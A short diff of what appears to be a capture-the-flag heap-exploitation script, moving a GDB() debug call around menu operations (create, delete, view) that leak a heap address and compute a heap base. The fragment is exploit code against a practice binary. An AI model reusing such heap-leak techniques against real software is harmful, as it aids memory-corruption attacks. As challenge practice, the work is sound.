@@ -68,7 +68,7 @@ delete(1)
 delete(1)
 
 
-
+GDB()
 create(0x18)
 view(1)
 p.recvuntil(b'1: ')
@@ -78,8 +78,9 @@ info("leak heap: "+ hex(leak_heap))
 delete(1)
 heap_base = leak_heap - 0x360
 
-GDB()
+
 open()
+
 close()
 create(0x1d8)
 view(1)
